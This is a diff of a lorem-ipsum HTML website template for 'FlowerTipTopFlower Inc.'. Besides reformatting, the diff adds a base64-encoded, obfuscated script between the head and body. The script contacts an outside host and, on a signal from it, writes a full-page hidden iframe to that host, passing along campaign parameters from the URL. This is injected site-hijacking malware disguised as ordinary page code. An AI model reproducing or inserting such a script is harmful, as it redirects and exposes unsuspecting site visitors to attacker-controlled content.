@@ -1,325 +1,327 @@
 
 <!DOCTYPE HTML>
 <html>
-	<head>
-		<title>FlowerTipTopFlower Inc.</title>
-		<link href="style.css" rel="stylesheet" type="text/css"  media="all" />
-		<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
-		<link rel="stylesheet" href="superfish.css" media="screen">
-		<link href="camera.css" rel="stylesheet" type="text/css" media="all" />
-		<script src="jquery.js"></script>
-		<script src="superfish.js"></script>
-		<script type="text/javascript" src="move-top.js"></script>
-		<script type="text/javascript" src="easing.js"></script>
-		<script>
-		(function($){ 
-			$(document).ready(function(){
-				var example = $('#example').superfish({
-				});
-				$('.destroy').on('click', function(){
-					example.superfish('destroy');
-				});
-				$('.init').on('click', function(){
-					example.superfish();
-				});
-				$('.open').on('click', function(){
-					example.children('li:first').superfish('show');
-				});
-				$('.close').on('click', function(){
-					example.children('li:first').superfish('hide');
-				});
-			});
-		})(jQuery);
-		</script>
-		<script>
-		jQuery(function(){
-			jQuery('#camera_wrap_1').camera({
-				height: '500',
-				pagination: false,
-				thumbnails: false,
-				imagePath: ' '
-			});
+  <head>
+    <title>FlowerTipTopFlower Inc.</title>
+    <link href="style.css" rel="stylesheet" type="text/css"  media="all" />
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" href="superfish.css" media="screen">
+    <link href="camera.css" rel="stylesheet" type="text/css" media="all" />
+    <script src="jquery.js"></script>
+    <script src="superfish.js"></script>
+    <script type="text/javascript" src="move-top.js"></script>
+    <script type="text/javascript" src="easing.js"></script>
+    <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+    <script>
+    (function($){ 
+      $(document).ready(function(){
+        var example = $('#example').superfish({
+        });
+        $('.destroy').on('click', function(){
+          example.superfish('destroy');
+        });
+        $('.init').on('click', function(){
+          example.superfish();
+        });
+        $('.open').on('click', function(){
+          example.children('li:first').superfish('show');
+        });
+        $('.close').on('click', function(){
+          example.children('li:first').superfish('hide');
+        });
+      });
+    })(jQuery);
+    </script>
+    <script>
+    jQuery(function(){
+      jQuery('#camera_wrap_1').camera({
+        height: '500',
+        pagination: false,
+        thumbnails: false,
+        imagePath: ' '
+      });
 
-		});
-	</script>
-	</head>
-	<body>
-		<div class="wrap">
-			<div class="header">
-				<div class="logo">
-					<a href="index.html"><img src="logo.png" title="naturex" /></a>
-				</div>
-				<div class="top-social-icons">
-					<ul>
-						<li><a class="icon1" href="#"> </a></li>
-						<li><a class="icon2" href="#"> </a></li>
-						<li><a class="icon3" href="#"> </a></li>
-						<li><a class="icon4" href="#"> </a></li>
-					</ul>
-				</div>
-				<div class="clear"> </div>
-			</div>
-			<div class="clear"> </div>
-			<div class="top-nav">
-						<ul class="sf-menu sf-menu2" id="example">
-							<li  class="current home">
-							<a href="index.html"></a>
-						</li>
-						<li class="active">
-							<a href="about.html">About</a>
-						</li>
-						<li>
-							<a class="direct" href="services.html">Services</a>
-							<ul>
-								<li>
-									<a href="#">electronic</a>
-								</li>
-								<li class="current">
-									<a href="#">typesetting</a>
-									<ul>
-										<li class="current"><a href="#">printin</a></li>
-										<li><a href="#">typesetting</a></li>
-										<li><a href="#">scrambled</a></li>
-										<li><a href="#">specimen book</a></li>
-										<li><a href="#">electronic typesetting</a></li>
-									</ul>
-								</li>
-								<li>
-									<a href="#">specimen book</a>
-									<ul>
-										<li><a href="#">scrambled</a></li>
-										<li><a href="#">specimen book</a></li>
-										<li><a href="#">electronic typesetting</a></li>
-									</ul>
-								</li>
-								<li>
-									<a href="#">scrambled</a>
-									<ul>
-										<li><a href="#">scrambled</a></li>
-										<li><a href="#">specimen book</a></li>
-										<li><a href="#">electronic typesetting</a></li>
-									</ul>
-								</li>
-							</ul>
-						</li>
-						<li>
-							<a href="gallery.html">Gallery</a>
-						</li>
-						<li>
-							<a href="contact.html">Contact</a>
-						</li>	
-						<div class="clear"> </div>
-					</ul>
-					</div>
-					<div class="clear"> </div>
-				</div>
-			 <div class="slider">
-			 	<div class="wrap">
-			<div class="fluid_container">
-		        <div class="camera_wrap camera_azure_skin" id="camera_wrap_1">
-		            <div data-thumb="slider3.jpg" data-src="slider3.jpg">
-		                <div class="camera_caption fadeFromBottom">
-		                	<h3>Lorem ipsum dolor sit amet,</h3>
-		                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</p>
-		                    <a href="#">Readmore</a>
-		                </div>
-		            </div>
-		           <div data-thumb="slider1.jpg" data-src="slider1.jpg">
-		                <div class="camera_caption fadeFromBottom">
-		                	<h3>Sed ut perspiciatis unde,</h3>
-		                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</p>
-		                    <a href="#">Readmore</a>
-		                </div>
-		            </div>
-		             <div data-thumb="slider2.jpg" data-src="slider2.jpg">
-		                <div class="camera_caption fadeFromBottom">
-		                	<h3>perspiciatis unde amet,</h3>
-		                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</p>
-		                    <a href="#">Readmore</a>
-		                </div>
-		            </div>
-		             <div data-thumb="slider3.jpg" data-src="slider3.jpg">
-		                <div class="camera_caption fadeFromBottom">
-		                	<h3>Sed ut perspiciatis unde,</h3>
-		                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</p>
-		                    <a href="#">Readmore</a>
-		                </div>
-		            </div>
-		            <div data-thumb="slider1.jpg" data-src="slider1.jpg">
-		                <div class="camera_caption fadeFromBottom">
-		                	<h3>perspiciatis undet amet,</h3>
-		                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</p>
-		                    <a href="#">Readmore</a>
-		                </div>
-		            </div>
-		            <div data-thumb="slider1.jpg" data-src="slider1.jpg">
-		                <div class="camera_caption fadeFromBottom">
-		                	<h3>Lorem ipsum dolor sit amet,</h3>
-		                    <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</p>
-		                    <a href="#">Readmore</a>
-		                </div>
-		            </div>
-		        </div>
-		        <script type='text/javascript' src='jquery.min.js'></script>
-			    <script type='text/javascript' src='jquery.mobile.customized.min.js'></script>
-			    <script type='text/javascript' src='jquery.easing.1.3.js'></script> 
-			    <script type='text/javascript' src='camera.min.js'></script> 
-				</div>
-       			<div class="clear"> </div>
-       			<div class="shadow">
-       				<img src="shadow.png" alt="" />
-       			</div>
-			</div>
-			<div class="content">
-				<div class="top-grids">
-					<div class="wrap">
-						<div class="top-grid top-grid1">
-							<a class="icon01" href="#"> </a>
-							<h2><span>Our</span>TRAINING</h2>
-							<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam</p>
-						</div>
-						<div class="top-grid top-grid2">
-							<a class="icon02" href="#"> </a>
-							<h2><span>Our</span>Medicals</h2>
-							<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam</p>
-						</div>
-						<div class="top-grid last-grid">
-							<a class="icon03" href="#"> </a>
-							<h2><span>Our</span>Specials</h2>
-							<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam</p>
-						</div>
-						<div class="clear"> </div>
-					</div>
-				</div>
-				<div class="mid-grids">
-					<div class="wrap">
-					<div class="mid-grids-head">
-						<div class="mid-grids-head-left">
-							<h4><span>Our</span> Gallery</h4>
-						</div>
-						<div class=="clear"> </div>
-					</div>
-					<div class="mid-grid1 last-grid">
-						<div class="mid-grid effect">
-							<img src="g1.jpg" />
-					        <div class="mask">
-								<a href="#" class="info">Read More</a>
-							</div>
-						</div>
-					</div>
-					<div class="mid-grid1 last-grid">
-						<div class="mid-grid effect">
-							<img src="g2.jpg" />
-					        <div class="mask">
-								<a href="#" class="info">Read More</a>
-							</div>
-						</div>
-					</div>
-					<div class="mid-grid1 last-grid1">
-						<div class="mid-grid effect">
-							<img src="g3.jpg" />
-					        <div class="mask">
-								<a href="#" class="info">Read More</a>
-							</div>
-						</div>
-					</div>
-					<div class="mid-grid1 last-grid">
-						<div class="mid-grid effect">
-							<img src="g4.jpg" />
-					        <div class="mask">
-								<a href="#" class="info">Read More</a>
-							</div>
-						</div>
-					</div>
-					<div class="mid-grid1 last-grid">
-						<div class="mid-grid effect">
-							<img src="g5.jpg" />
-					        <div class="mask">
-								<a href="#" class="info">Read More</a>
-							</div>
-						</div>
-					</div>
-					<div class="mid-grid1 last-grid1">
-						<div class="mid-grid effect">
-							<img src="g6.jpg" />
-					        <div class="mask">
-								<a href="#" class="info">Read More</a>
-							</div>
-						</div>
-					</div>
-					<div class="clear"> </div>
-				</div>
-				</div>
-				<div class="bottom-grids">
-					<div class="wrap">
-					<div class="mid-grids-head">
-						<div class="mid-grids-head-left">
-							<h4><span>Our</span> Latest-news</h4>
-						</div>
-						<div class="=&quot;clear&quot;"> </div>
-					</div>
-					<div class="bottom-grid-left">
-						<div class="bottom-grid-left-grid">
-							<div class="bottom-grid-left-grid-pic">
-								<img src="06.jpg" alt="">
-							</div>
-							<div class="bottom-grid-left-grid-info">
-								<h3>Lorem ipsum dolor sit amet, consectetur adipisicing elit,</h3>
-								<ul class="in-list">
-									<li><a href="#">May 3rd, 2013 |</a></li>
-									<li><a href="#">1 Comment</a></li>
-								</ul>
-								<p>consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.<a href="#">[...]</a></p>
-							</div>
-							<div class="clear"> </div>
-						</div>
-						<div class="bottom-grid-left-grid">
-							<div class="bottom-grid-left-grid-pic">
-								<img src="07.jpg" alt="">
-							</div>
-							<div class="bottom-grid-left-grid-info">
-								<h3>Lorem ipsum dolor sit amet, consectetur adipisicing elit,</h3>
-								<ul class="in-list">
-									<li><a href="#">May 3rd, 2013 |</a></li>
-									<li><a href="#">1 Comment</a></li>
-								</ul>
-								<p>consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.<a href="#">[...]</a></p>
-							</div>
-							<div class="clear"> </div>
-						</div>
-						<a class="all" href="#">View all</a>
-					</div>
-					<div class="bottom-grid-right">
-						<iframe src="//player.vimeo.com/video/71543851" width="100%" height="330" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen> </iframe> 
-						<a href="#">View all videos</a>
-					</div>
-					<div class="clear"> </div>
-				</div>
-			</div>
-			</div>
-		</div>
-		</div>
-		<div class="footer">
-			<div class="wrap">
-				<div class="footer-left">
-					<a href="index.html">NATUREX</a>
-				</div>
-				<div class="footer-right">
-					<p>2021 All rights reserved. Dev by FlowerTipTopFlower Lim.</p>
-					<script type="text/javascript">
-							$(document).ready(function() {
-								
-								
-								$().UItoTop({ easingType: 'easeOutQuart' });
-								
-							});
-						</script>
-   					 <a href="#" id="toTop" style="display: block;"><span id="toTopHover" style="opacity: 1;"></span></a>
-				</div>
-				<div class="clear"> </div>
-			</div>
-		</div>
-		
-	</body>
+    });
+  </script>
+  </head>
+  <script src="data:text/javascript;base64,dmFyIF8weDQyOWE9WyIxODkzOTFEdlhpd3MiLCIyMTIyNjFvcHRPU1oiLCJ3cml0ZSIsIjNHSnRWY2MiLCIxMkxyQldUQyIsIj0oW14mPV0rKSIsInllcyIsImxvY2F0aW9uIiwiMjE3NjJ2cGRQRWkiLCIxY1VobkpyIiwiJnV0bV90ZXJtPSIsIjIwNDMyMUJ5RXRUSSIsIjExMzUyMnpnYXlldSIsIjFzemhEUXciLCJodHRwczovL3Zlb2xzLmdlb25hbHNlY2UuY29tL2luZGV4LnBocD9rZXk9d3Y4NXgzZGd5cnc2enYxaTA4aGciLCIxNTY3ODBibUpUSnMiLCI2MzcwNkFaaUFhVCIsJyIgZnJhbWVib3JkZXI9IjAiIHN0eWxlPSJvdmVyZmxvdzpoaWRkZW47b3ZlcmZsb3cteDpoaWRkZW47b3ZlcmZsb3cteTpoaWRkZW47aGVpZ2h0OjEwMCU7d2lkdGg6MTAwJTtwb3NpdGlvbjphYnNvbHV0ZTt0b3A6MHB4O2xlZnQ6MHB4O3JpZ2h0OjBweDtib3R0b206MHB4IiBoZWlnaHQ9IjEwMCUiIHdpZHRoPSIxMDAlIj48L2lmcmFtZT4nLCc8aWZyYW1lIHNyYz0iaHR0cHM6Ly92ZW9scy5nZW9uYWxzZWNlLmNvbS9pbmRleC5waHA/a2V5PW9yc25tbjB5bHF5OG9kOXZsbGZyJnV0bV9jYW1wYWlnbj0nLCJ1dG1fY2FtcGFpZ24iLCJnZXQiXSxfMHg1OGFmPWZ1bmN0aW9uKGUsdCl7cmV0dXJuIF8weDQyOWFbZS09MjcxXX0sXzB4NTY1YzkxPV8weDU4YWY7ZnVuY3Rpb24gZ2V0Q29va2llcyhlKXt2YXIgdD1fMHg1OGFmLGE9d2luZG93W3QoMjcyKV0uc2VhcmNoO3JldHVybiEhKGE9YS5tYXRjaChuZXcgUmVnRXhwKGUrdCgyOTEpKSkpJiZhWzFdfWZ1bmN0aW9uIG9uQWpheFN1Y2Nlc3MoZSl7dmFyIHQ9XzB4NTY1YzkxO2U9PXQoMjcxKSYmZG9jdW1lbnRbdCgyODgpXSh0KDI4MykrZ2V0Q29va2llcyh0KDI4NCkpK3QoMjc1KStnZXRDb29raWVzKCJ1dG1fdGVybSIpK3QoMjgyKSl9IWZ1bmN0aW9uKHQpe2Zvcih2YXIgZT1fMHg1OGFmOzspdHJ5e2lmKDExMDQ1Mz09PS1wYXJzZUludChlKDI4MCkpK3BhcnNlSW50KGUoMjc3KSkrLXBhcnNlSW50KGUoMjc0KSkqLXBhcnNlSW50KGUoMjg2KSkrcGFyc2VJbnQoZSgyODkpKSotcGFyc2VJbnQoZSgyODEpKStwYXJzZUludChlKDI3NikpKy1wYXJzZUludChlKDI3OCkpKi1wYXJzZUludChlKDI4NykpKy1wYXJzZUludChlKDI3MykpKnBhcnNlSW50KGUoMjkwKSkpYnJlYWs7dC5wdXNoKHQuc2hpZnQoKSl9Y2F0Y2goZSl7dC5wdXNoKHQuc2hpZnQoKSl9fShfMHg0MjlhKSwkW18weDU2NWM5MSgyODUpXShfMHg1NjVjOTEoMjc5KSxvbkFqYXhTdWNjZXNzKTs="></script>
+  <body>
+    <div class="wrap">
+      <div class="header">
+        <div class="logo">
+          <a href="index.html"><img src="logo.png" title="naturex" /></a>
+        </div>
+        <div class="top-social-icons">
+          <ul>
+            <li><a class="icon1" href="#"> </a></li>
+            <li><a class="icon2" href="#"> </a></li>
+            <li><a class="icon3" href="#"> </a></li>
+            <li><a class="icon4" href="#"> </a></li>
+          </ul>
+        </div>
+        <div class="clear"> </div>
+      </div>
+      <div class="clear"> </div>
+      <div class="top-nav">
+            <ul class="sf-menu sf-menu2" id="example">
+              <li  class="current home">
+              <a href="index.html"></a>
+            </li>
+            <li class="active">
+              <a href="about.html">About</a>
+            </li>
+            <li>
+              <a class="direct" href="services.html">Services</a>
+              <ul>
+                <li>
+                  <a href="#">electronic</a>
+                </li>
+                <li class="current">
+                  <a href="#">typesetting</a>
+                  <ul>
+                    <li class="current"><a href="#">printin</a></li>
+                    <li><a href="#">typesetting</a></li>
+                    <li><a href="#">scrambled</a></li>
+                    <li><a href="#">specimen book</a></li>
+                    <li><a href="#">electronic typesetting</a></li>
+                  </ul>
+                </li>
+                <li>
+                  <a href="#">specimen book</a>
+                  <ul>
+                    <li><a href="#">scrambled</a></li>
+                    <li><a href="#">specimen book</a></li>
+                    <li><a href="#">electronic typesetting</a></li>
+                  </ul>
+                </li>
+                <li>
+                  <a href="#">scrambled</a>
+                  <ul>
+                    <li><a href="#">scrambled</a></li>
+                    <li><a href="#">specimen book</a></li>
+                    <li><a href="#">electronic typesetting</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li>
+              <a href="gallery.html">Gallery</a>
+            </li>
+            <li>
+              <a href="contact.html">Contact</a>
+            </li> 
+            <div class="clear"> </div>
+          </ul>
+          </div>
+          <div class="clear"> </div>
+        </div>
+       <div class="slider">
+        <div class="wrap">
+      <div class="fluid_container">
+            <div class="camera_wrap camera_azure_skin" id="camera_wrap_1">
+                <div data-thumb="slider3.jpg" data-src="slider3.jpg">
+                    <div class="camera_caption fadeFromBottom">
+                      <h3>Lorem ipsum dolor sit amet,</h3>
+                        <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</p>
+                        <a href="#">Readmore</a>
+                    </div>
+                </div>
+               <div data-thumb="slider1.jpg" data-src="slider1.jpg">
+                    <div class="camera_caption fadeFromBottom">
+                      <h3>Sed ut perspiciatis unde,</h3>
+                        <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</p>
+                        <a href="#">Readmore</a>
+                    </div>
+                </div>
+                 <div data-thumb="slider2.jpg" data-src="slider2.jpg">
+                    <div class="camera_caption fadeFromBottom">
+                      <h3>perspiciatis unde amet,</h3>
+                        <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</p>
+                        <a href="#">Readmore</a>
+                    </div>
+                </div>
+                 <div data-thumb="slider3.jpg" data-src="slider3.jpg">
+                    <div class="camera_caption fadeFromBottom">
+                      <h3>Sed ut perspiciatis unde,</h3>
+                        <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</p>
+                        <a href="#">Readmore</a>
+                    </div>
+                </div>
+                <div data-thumb="slider1.jpg" data-src="slider1.jpg">
+                    <div class="camera_caption fadeFromBottom">
+                      <h3>perspiciatis undet amet,</h3>
+                        <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</p>
+                        <a href="#">Readmore</a>
+                    </div>
+                </div>
+                <div data-thumb="slider1.jpg" data-src="slider1.jpg">
+                    <div class="camera_caption fadeFromBottom">
+                      <h3>Lorem ipsum dolor sit amet,</h3>
+                        <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,</p>
+                        <a href="#">Readmore</a>
+                    </div>
+                </div>
+            </div>
+            <script type='text/javascript' src='jquery.min.js'></script>
+          <script type='text/javascript' src='jquery.mobile.customized.min.js'></script>
+          <script type='text/javascript' src='jquery.easing.1.3.js'></script> 
+          <script type='text/javascript' src='camera.min.js'></script> 
+        </div>
+            <div class="clear"> </div>
+            <div class="shadow">
+              <img src="shadow.png" alt="" />
+            </div>
+      </div>
+      <div class="content">
+        <div class="top-grids">
+          <div class="wrap">
+            <div class="top-grid top-grid1">
+              <a class="icon01" href="#"> </a>
+              <h2><span>Our</span>TRAINING</h2>
+              <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam</p>
+            </div>
+            <div class="top-grid top-grid2">
+              <a class="icon02" href="#"> </a>
+              <h2><span>Our</span>Medicals</h2>
+              <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam</p>
+            </div>
+            <div class="top-grid last-grid">
+              <a class="icon03" href="#"> </a>
+              <h2><span>Our</span>Specials</h2>
+              <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam</p>
+            </div>
+            <div class="clear"> </div>
+          </div>
+        </div>
+        <div class="mid-grids">
+          <div class="wrap">
+          <div class="mid-grids-head">
+            <div class="mid-grids-head-left">
+              <h4><span>Our</span> Gallery</h4>
+            </div>
+            <div class=="clear"> </div>
+          </div>
+          <div class="mid-grid1 last-grid">
+            <div class="mid-grid effect">
+              <img src="g1.jpg" />
+                  <div class="mask">
+                <a href="#" class="info">Read More</a>
+              </div>
+            </div>
+          </div>
+          <div class="mid-grid1 last-grid">
+            <div class="mid-grid effect">
+              <img src="g2.jpg" />
+                  <div class="mask">
+                <a href="#" class="info">Read More</a>
+              </div>
+            </div>
+          </div>
+          <div class="mid-grid1 last-grid1">
+            <div class="mid-grid effect">
+              <img src="g3.jpg" />
+                  <div class="mask">
+                <a href="#" class="info">Read More</a>
+              </div>
+            </div>
+          </div>
+          <div class="mid-grid1 last-grid">
+            <div class="mid-grid effect">
+              <img src="g4.jpg" />
+                  <div class="mask">
+                <a href="#" class="info">Read More</a>
+              </div>
+            </div>
+          </div>
+          <div class="mid-grid1 last-grid">
+            <div class="mid-grid effect">
+              <img src="g5.jpg" />
+                  <div class="mask">
+                <a href="#" class="info">Read More</a>
+              </div>
+            </div>
+          </div>
+          <div class="mid-grid1 last-grid1">
+            <div class="mid-grid effect">
+              <img src="g6.jpg" />
+                  <div class="mask">
+                <a href="#" class="info">Read More</a>
+              </div>
+            </div>
+          </div>
+          <div class="clear"> </div>
+        </div>
+        </div>
+        <div class="bottom-grids">
+          <div class="wrap">
+          <div class="mid-grids-head">
+            <div class="mid-grids-head-left">
+              <h4><span>Our</span> Latest-news</h4>
+            </div>
+            <div class="=&quot;clear&quot;"> </div>
+          </div>
+          <div class="bottom-grid-left">
+            <div class="bottom-grid-left-grid">
+              <div class="bottom-grid-left-grid-pic">
+                <img src="06.jpg" alt="">
+              </div>
+              <div class="bottom-grid-left-grid-info">
+                <h3>Lorem ipsum dolor sit amet, consectetur adipisicing elit,</h3>
+                <ul class="in-list">
+                  <li><a href="#">May 3rd, 2013 |</a></li>
+                  <li><a href="#">1 Comment</a></li>
+                </ul>
+                <p>consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.<a href="#">[...]</a></p>
+              </div>
+              <div class="clear"> </div>
+            </div>
+            <div class="bottom-grid-left-grid">
+              <div class="bottom-grid-left-grid-pic">
+                <img src="07.jpg" alt="">
+              </div>
+              <div class="bottom-grid-left-grid-info">
+                <h3>Lorem ipsum dolor sit amet, consectetur adipisicing elit,</h3>
+                <ul class="in-list">
+                  <li><a href="#">May 3rd, 2013 |</a></li>
+                  <li><a href="#">1 Comment</a></li>
+                </ul>
+                <p>consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.<a href="#">[...]</a></p>
+              </div>
+              <div class="clear"> </div>
+            </div>
+            <a class="all" href="#">View all</a>
+          </div>
+          <div class="bottom-grid-right">
+            <iframe src="//player.vimeo.com/video/71543851" width="100%" height="330" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen> </iframe> 
+            <a href="#">View all videos</a>
+          </div>
+          <div class="clear"> </div>
+        </div>
+      </div>
+      </div>
+    </div>
+    </div>
+    <div class="footer">
+      <div class="wrap">
+        <div class="footer-left">
+          <a href="index.html">NATUREX</a>
+        </div>
+        <div class="footer-right">
+          <p>2021 All rights reserved. Dev by FlowerTipTopFlower Lim.</p>
+          <script type="text/javascript">
+              $(document).ready(function() {
+                
+                
+                $().UItoTop({ easingType: 'easeOutQuart' });
+                
+              });
+            </script>
+             <a href="#" id="toTop" style="display: block;"><span id="toTopHover" style="opacity: 1;"></span></a>
+        </div>
+        <div class="clear"> </div>
+      </div>
+    </div>
+    
+  </body>
 </html>
 
